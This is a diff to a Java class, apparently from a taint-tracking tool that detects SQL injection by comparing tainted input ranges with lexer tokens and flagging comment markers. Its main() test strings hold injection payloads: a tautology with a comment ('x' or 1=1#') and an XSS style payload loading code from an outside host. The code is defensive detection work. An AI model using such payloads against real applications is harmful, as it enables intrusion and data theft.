@@ -28,15 +28,27 @@ public class SQLChecker {
             int taint_start = addl_pos + taint_range.getInt("start");
             int taint_end = addl_pos + taint_range.getInt("end");
             for(SqlLexerToken token: tokens){
-                if(checkBorders(token,taint_start,taint_end) || startsComment(token,taint_start,taint_end)){
+                if(checkBorders(token,taint_start,taint_end) || (token.token_type == 1)){
                     JSONObject injection_info_obj = new JSONObject();
                     JSONObject token_info = new JSONObject();
                     token_info.put("start",token.begin);
                     token_info.put("end",token.end);
                     token_info.put("sql_token",token.token);
+                    token_info.put("sql_token_type",token.token_type);
                     injection_info_obj.put("token_info",token_info);
                     injection_info_obj.put("taint_info",taint_range);
                     injection_info_arr.put(injection_info_obj);
+                    if(token.has_comment){
+                        JSONObject injection_info_obj2 = new JSONObject();
+                        JSONObject token_info2 = new JSONObject();
+                        token_info2.put("start",token.begin);
+                        token_info2.put("end",token.end);
+                        token_info2.put("sql_token","Comment");
+                        token_info2.put("sql_token_type",-1);
+                        injection_info_obj2.put("token_info",token_info2);
+                        injection_info_obj2.put("taint_info",taint_range);
+                        injection_info_arr.put(injection_info_obj2);
+                    }
                 }
             }
         }
@@ -48,73 +60,95 @@ public class SQLChecker {
                 taint_start < token.end && token.end < taint_end;
     }
 
-    private static boolean startsComment(SqlLexerToken token_range,int taint_start,int taint_end){
-        return token_range.token_type == 1 && taint_start <= token_range.begin && taint_end >= token_range.begin + 2;
-    }
-
     private static List<SqlLexerToken> getLexerTokens(String sql_query) {
         System.out.println("SQL Query : " + sql_query);
         List<SqlLexerToken> lexer_tokens = new ArrayList<>();
+        DbType db_type = DbType.mysql;
 
         try {
             // Parse SQL Query
-            SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql_query, DbType.mysql);
+            SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql_query, db_type);
             List<SQLStatement> statementList = parser.parseStatementList();
             if(statementList.size() > 1){
-                lexer_tokens.add(new SqlLexerToken(0,sql_query.length()-1,"Multiple_SQL_Queries",0));
+                lexer_tokens.add(new SqlLexerToken(0,sql_query.length()-1,"Multiple_SQL_Queries",1,false));
                 return lexer_tokens;
             }
-            Lexer lexer = SQLParserUtils.createLexer(sql_query, DbType.mysql);
+            Lexer lexer = SQLParserUtils.createLexer(sql_query, db_type);
             int startPos = lexer.pos();
             lexer.nextToken();
             while(lexer.token() != Token.EOF){
                 // Create the corresponding LexerToken
-                lexer_tokens.add(new SqlLexerToken(startPos,lexer.pos(),lexer.token().toString(),0));
+                lexer_tokens.add(new SqlLexerToken(startPos,lexer.pos(),lexer.token().toString(),0, lexer.hasComment()));
                 System.out.println("tokenType : " + lexer.token() + ", startPos : " + startPos + ", endPos : " + lexer.pos());
                 startPos = lexer.pos();
                 lexer.nextToken();
             }
+            if(startPos != sql_query.length()){
+                lexer_tokens.add(new SqlLexerToken(startPos,sql_query.length(),"Unparsed_Segment",0,true));
+            }
         }
         catch (ParserException e) {
-            //System.out.println("sql parsing exception : " + Arrays.toString(e.getStackTrace()));
-            lexer_tokens.add(new SqlLexerToken(0,sql_query.length()-1,"SQL_Parsing_Error",0));
-            return lexer_tokens;
+            System.out.println("SQL Parsing Exception");
+            lexer_tokens.add(new SqlLexerToken(0,sql_query.length()-1,"SQL_Parsing_Error",1,false));
+            //return lexer_tokens;
         }
         catch (Exception ex){
             ex.printStackTrace();
         }
 
-        // Check for comment injection
-        Pattern comment_pattern1 = Pattern.compile("(?:/\\*)+");
-        Matcher matcher1 = comment_pattern1.matcher(sql_query.toLowerCase(Locale.ROOT));
-        while(matcher1.find()){
-            lexer_tokens.add(new SqlLexerToken(matcher1.start(),matcher1.end(),"/*",1));
-        }
-        Pattern comment_pattern2 = Pattern.compile("[#]+");
-        Matcher matcher2 = comment_pattern2.matcher(sql_query.toLowerCase(Locale.ROOT));
-        while(matcher2.find()){
-            lexer_tokens.add(new SqlLexerToken(matcher2.start(),matcher2.end(),"#",1));
-        }
-        Pattern comment_pattern3 = Pattern.compile("[-]{2,}");
-        Matcher matcher3 = comment_pattern3.matcher(sql_query.toLowerCase(Locale.ROOT));
-        while(matcher3.find()){
-            lexer_tokens.add(new SqlLexerToken(matcher3.start(),matcher3.end(),"--",1));
-        }
         return lexer_tokens;
     }
 
-
-
-    public static void reportTaintedString(String tainted_string) throws RuntimeException, IOException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InterruptedException {
+    public static void reportTaintedString(String tainted_string) throws RuntimeException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InterruptedException {
         JSONObject json_obj = new JSONObject(tainted_string);
         String sql_string = json_obj.getString("payload");
-        List<SqlLexerToken> token_ranges = getLexerTokens(sql_string);
-        JSONArray taint_ranges = json_obj.getJSONArray("ranges");
         int addl_pos = 0;
 
-        JSONArray json_array = getSqlInjectionInfo(token_ranges,taint_ranges,addl_pos);
-        System.out.println("checkTaintedString : " + json_array.toString());
-        NetworkResponseObject.setResponseMessage(new NetworkRequestObject(),!json_array.isEmpty());
+        // Sql String template (temporary fix) if parameters are bound to the original string
+        if(json_obj.getString("sink").equals("java/sql/PreparedStatement.setString(ILjava/lang/String;)V")){
+            class SQLElement{
+                public String sql_statement;
+                public int start_pos;
+
+                public SQLElement(String sql_statement, int start_pos){
+                    this.sql_statement = sql_statement;
+                    this.start_pos = start_pos;
+                }
+            }
+            List<SQLElement> sql_element_list = new ArrayList<>();
+            sql_element_list.add(new SQLElement("SELECT * FROM table1 WHERE username = '" + sql_string + "'", 39));
+            sql_element_list.add(new SQLElement("SELECT * FROM table1 WHERE username = \"" + sql_string + "\"", 39));
+
+            boolean sql_injection_present = false;
+
+            for(SQLElement sql_element : sql_element_list){
+                List<SqlLexerToken> token_ranges = getLexerTokens(sql_element.sql_statement);
+                JSONArray taint_ranges = json_obj.getJSONArray("ranges");
+                JSONArray inj_info_array = getSqlInjectionInfo(token_ranges,taint_ranges,sql_element.start_pos);
+                System.out.println("checkTaintedString : " + inj_info_array.toString());
+                if(!inj_info_array.isEmpty()){
+                    sql_injection_present = true;
+                }
+            }
+            NetworkResponseObject.setResponseMessage(new NetworkRequestObject(),sql_injection_present);
+        }
+        else if(json_obj.getString("sink").equals("java/sql/PreparedStatement.setInt(II)V")){
+            String sql_stmt = "SELECT * FROM table1 WHERE id = " + sql_string;
+            List<SqlLexerToken> token_ranges = getLexerTokens(sql_stmt);
+            JSONArray taint_ranges = json_obj.getJSONArray("ranges");
+
+            JSONArray json_array = getSqlInjectionInfo(token_ranges,taint_ranges,32);
+            System.out.println("checkTaintedString : " + json_array.toString());
+            NetworkResponseObject.setResponseMessage(new NetworkRequestObject(),!json_array.isEmpty());
+        }
+        else{
+            List<SqlLexerToken> token_ranges = getLexerTokens(sql_string);
+            JSONArray taint_ranges = json_obj.getJSONArray("ranges");
+
+            JSONArray json_array = getSqlInjectionInfo(token_ranges,taint_ranges,addl_pos);
+            System.out.println("checkTaintedString : " + json_array.toString());
+            NetworkResponseObject.setResponseMessage(new NetworkRequestObject(),!json_array.isEmpty());
+        }
     }
 
     public static void logTaintedString(String tainted_string) throws RuntimeException, IOException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InterruptedException {
@@ -162,7 +196,7 @@ public class SQLChecker {
 
     public static void main(String[] args) {
         //String sqlString = "insert into table1 values      (data1, data2)";
-        String sqlString = "SELECT * FROM table1 WHERE username = 'x' or 1=1#'";
+        String sqlString = "SELECT * FROM table1 WHERE username = \"<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\"";
 //        SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sqlString, DbType.mysql);
 //        parser.parseStatementList();
 //
@@ -178,3 +212,25 @@ public class SQLChecker {
     }
 
 }
+
+//    private static boolean hasComment(String sql_stmt,SqlLexerToken token){
+//        if(token.token.equals("LITERAL_CHARS") || token.token.equals("LITERAL_ALIAS")){
+//            return false;
+//        }
+//        String token_string = sql_stmt.substring(token.begin, token.end);
+//
+//        // Check for comment presence
+//        Pattern comment_pattern1 = Pattern.compile("(?:/\\*)+");
+//        Matcher matcher1 = comment_pattern1.matcher(token_string.toLowerCase(Locale.ROOT));
+//
+//        Pattern comment_pattern2 = Pattern.compile("[#]+");
+//        Matcher matcher2 = comment_pattern2.matcher(token_string.toLowerCase(Locale.ROOT));
+//
+//        Pattern comment_pattern3 = Pattern.compile("[-]{2,}");
+//        Matcher matcher3 = comment_pattern3.matcher(token_string.toLowerCase(Locale.ROOT));
+//        return matcher1.find() || matcher2.find() || matcher3.find();
+//    }
+
+//    private static boolean startsComment(SqlLexerToken token_range,int taint_start,int taint_end){
+//        return token_range.token_type == 1 && taint_start <= token_range.begin && taint_end >= token_range.begin + 2;
+//    }
